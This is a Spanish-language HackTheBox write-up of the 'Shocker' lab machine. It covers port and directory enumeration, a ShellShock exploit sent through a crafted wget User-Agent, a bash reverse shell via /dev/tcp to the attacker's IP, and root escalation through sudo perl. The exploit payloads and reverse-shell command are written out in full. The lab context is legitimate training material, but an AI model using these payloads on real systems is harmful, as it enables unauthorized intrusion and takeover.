---
title: "Shocker - HTB Writeup"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "![teaser](https://user-images.githubusercontent.com/67548295/124353452-25f23480-dbf6-11eb-9623-1cb0d9205099.png)"
  teaser_home_page: true
  icon: "![icono](assets/images/icons/HackTheBox-icon.png)"
categories:
  - Writeup
  - HackTheBox
tags:
  - ShellShock
  - Perl
  - sudo
---


![titulo](https://user-images.githubusercontent.com/67548295/124353510-76699200-dbf6-11eb-81f4-54547de662d1.png)


# Enumeración

Primero, antes de empezar a escanear puertos y todo lo demás, voy a lanzar una traza ICMP con ```ping``` para ver si la máquina está activa:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $ping -c 1 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
64 bytes from 10.10.10.56: icmp_seq=1 ttl=63 time=69.3 ms

--- 10.10.10.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 69.344/69.344/69.344/0.000 ms
```

La máquina nos contesta, quiere decir que está activa, y además mediante el TTL puedo ver que es una máquina con OS Linux.

Más información sobre la deteccion de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

# Nmap

Comenzamos con el escaneo de puertos:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $nmap --open -n -T5 10.10.10.56 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 13:11 WEST
Nmap scan report for 10.10.10.56
Host is up (0.071s latency).
Not shown: 691 closed ports, 307 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

Podemos ver que tenemos el puerto 2222 y 80:
* 80 --> HTTP
* 2222 --> SSH

# User

Vamos a ver lo que hay en el servidor web que hay por el puerto 80:

![navegador1](https://user-images.githubusercontent.com/67548295/124353831-6baffc80-dbf8-11eb-8a89-943741d1ca3a.png)

Y podemos ver que solo hay una simple imagen.

Después de esto, hago uso de la herramienta ```wfuzz``` para enumerar directorios en la web:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $wfuzz -c --hc=404 -w /usr/share/dirb/wordlists/big.txt -u "http://10.10.10.56/FUZZ" -t 50

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000016:   403        11 L     32 W       295 Ch      ".htpasswd"                                                                                                               
000000015:   403        11 L     32 W       295 Ch      ".htaccess"                                                                                                               
000004349:   403        11 L     32 W       294 Ch      "cgi-bin/"                                                                                                                
```
Y vemos que hay un directorio cgi-bin. Seguidamente pruebo a fuzzear en ese directorio en busca de archivos con extensiones comunes.

Ya que si hay archivos y la version de bash es vulnerable, podriamos aprovecharnos de la vulnerabilidad ShellShock para ganar acceso al sistema.

ShellShock es una vulnerabilidad descubierta en 2014 que permite ejecutar codigo de forma remota en la maquina de la victima, [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

Esta vulnerabilidad es posible porque porque bash permite declarar funciones, pero estas no se validan de forma correcta cuando se almacenan en una variable.

Sabiendo esto, fuzzeo por esa ruta encontrada: 

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $gobuster dir -u "http://10.10.10.56/cgi-bin/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,sh,py
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        50
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sh,py
[+] Timeout:        10s
===============================================================
2021/07/03 13:46:57 Starting gobuster
===============================================================
/user.sh (Status: 200)
```
Hay un script con nombre _user.sh_, lo descargo pero no hay nada interesante en el.

Pruebo a ver si es vulnerable a la vulnerabilidad ShellShock:

```bash
|─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $wget -U '() { :;}; /bin/bash -c "ping -c 1 10.10.16.15"' http://10.10.10.56/cgi-bin/user.sh
--2021-07-03 13:54:39--  http://10.10.10.56/cgi-bin/user.sh
Conectando con 10.10.10.56:80... conectado.
Petición HTTP enviada, esperando respuesta... 500 Internal Server Error
2021-07-03 13:54:40 ERROR 500: Internal Server Error.
```

Ahi he probado a mandarme una traza icmp a mi maquina mientras estaba en escucha con ```tcpdump```
y me ha llegado la petición:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $sudo tcpdump -i tun0 icmp
 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:54:40.138435 IP 10.10.10.56 > 10.10.16.15: ICMP echo request, id 13628, seq 1, length 64
13:54:40.138492 IP 10.10.16.15 > 10.10.10.56: ICMP echo reply, id 13628, seq 1, length 64

```

Pues bueno, ya teniendo ejecución remota de comandos, es muy sencillo ganar acceso al sistema.

Una simple reverse shell en bash sirve:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Shocker/nmap]
└──╼ $wget -U '() { :;}; /bin/bash -c "bash -i >& /dev/tcp/10.10.16.15/4444 0>&1"' http://10.10.10.56/cgi-bin/user.sh
--2021-07-03 13:59:05--  http://10.10.10.56/cgi-bin/user.sh
Conectando con 10.10.10.56:80... conectado.
Petición HTTP enviada, esperando respuesta... 
```
Hacemos la petición a la vez que estamos en escucha por el puerto especificado en la reverse shell.

Y obtenemos acceso al sistema:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.56 42136
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

A partir de aqui podemos ver la flag del user:

```bash
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt

cf33XXXXXXXXXXXXXXXXXXXXd5c573fd

shelly@Shocker:/usr/lib/cgi-bin$
```

# Privilege Escalation

Enumerando el sistema en busca de un vector para escalar privilegios, me encuentro que podemos ejecutar ```perl``` como el usuario root:

```bash
shelly@Shocker:/$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/$ 
```
Hago uso de la utilidad [GTFObins](https://gtfobins.github.io/) para spawnear una bash con perl:

![navegador2](https://user-images.githubusercontent.com/67548295/124355337-1546bc00-dc00-11eb-87aa-a0b3d8374d22.png)

Como se puede ver, podemos generar una shell con ese comando. Como podemos correr perl como root, ya podemos rootear la maquina:

```bash
shelly@Shocker:/$ sudo /usr/bin/perl -e 'exec "/bin/sh";'

# id

uid=0(root) gid=0(root) groups=0(root)
```

Y listo, máquina rooteada. En /root/ podremos ver la flag de root:

```bash
# cat /root/root.txt

2eb63e9XXXXXXXXXXXXXXXXXXXX90d45
```

# Opinión

La máquina ha sido bastante facil, pero a la vez me ha permitido repasar conceptos, me ha gustado.




